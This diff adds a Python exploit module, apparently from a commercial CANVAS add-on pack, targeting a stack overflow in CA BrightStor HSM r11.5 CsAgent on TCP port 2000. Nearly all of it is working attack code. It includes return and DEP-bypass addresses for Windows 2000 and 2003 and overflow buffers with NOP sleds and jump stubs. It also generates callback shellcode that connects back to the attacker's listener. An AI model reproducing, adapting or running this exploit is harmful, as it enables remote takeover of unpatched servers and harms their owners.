@@ -1,0 +1,160 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "CA BrightStor HSM r11.5 - CsAgent Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in CA BrightStor HSM r11.5 CsAgent"
+DOCUMENTATION = {}
+DOCUMENTATION["References"] = "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=601"
+DOCUMENTATION["Versions Affected"] = "CA BrightStor HSM r11.5"
+DOCUMENTATION["Date public"] = "2007.09.27"
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+
+targets = {    
+    0: ['Windows 2000 SP0-SP4 / Windows 2003 SP0',  0x12011739],  # pop edi, pop esi, retn @ CsAgent.exe
+    1: ['Windows 2003 SP1 English (DEP)', 0x7c83e413, 0x12098542], # anti-dep / jmp esp @ CsAgent.exe
+    2: ['Windows 2003 SP1 French (DEP)',  0x7c95e413, 0x12098542], # anti-dep / jmp esp @ CsAgent.exe 
+    3: ['Windows 2003 SP2 English (DEP)', 0x7c83f517, 0x12098542], # anti-dep / jmp esp @ CsAgent.exe
+    4: ['Windows 2003 SP2 French (DEP)',  0x7c95f517, 0x12098542], # anti-dep / jmp esp @ CsAgent.exe 
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 2000
+        self.host = ""                                
+        self.name = NAME   
+        self.badstring = "\x00"     
+        return
+        
+    def neededListenerTypes(self):
+				return [canvasengine.WIN32MOSDEF]
+				
+    def createShellcode(self):
+				return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)
+				
+    def test(self):        
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+                
+        s = self.gettcpsock()        
+        
+        try:
+            s.connect((self.host, self.port))
+        except:
+            self.log("No connection could be established")
+            return 0        
+        
+        return 1
+    
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+            s = self.gettcpsock()
+            s.connect((self.host, self.port))
+            s.sendall(sploitstring)
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+				"""        								
+				
+        if (self.version >= 1): # Windows 2003 SP1/SP2
+					os_name, anti_dep, jmp_esp = targets[self.version]
+				  
+					data_1 = ("A" * 486) + struct.pack('<L', anti_dep) + ("B" * 539) + ("C" * 16) + struct.pack('<L', jmp_esp) + ("CCCC")
+					data_2 = "\x90" * 1057
+					data_3 = struct.pack('<L', 0x7ffda010)
+					data_4 = "\x90" * 800
+					jmp = "\x90\x90\xeb\x06\x90\x90\x90\x90"
+				  
+					tmp = data_2[0:4]
+					tmp += self.shellcode
+					tmp += data_2[4 + len(self.shellcode):]	
+          				  
+					sploitstring = "\x5a\x0b\x00\x00\x37\x00\x00\x00" + data_1 + jmp + tmp + data_3 + data_4
+				
+        else:                   # Windows 2000 / Windows 2003 SP0
+					os_name, pop_pop_ret = targets[self.version]
+					
+					data_1 = "A" * 2094
+					data_2 = "\x90" * 800
+					jmp = "\x90\x90\xeb\x06"
+					ret = struct.pack('<L', pop_pop_ret)
+					
+					tmp = data_2[0:4]
+					tmp += self.shellcode
+					tmp += data_2[4 + len(self.shellcode):]	
+					
+					sploitstring = "\x5a\x0b\x00\x00\x37\x00\x00\x00" + data_1 + jmp + ret + tmp
+								        
+        
+        return sploitstring
+        
+    def usage(self):
+        print 'Usage: %s -v version -t host -l localIP -d localPort'%(sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
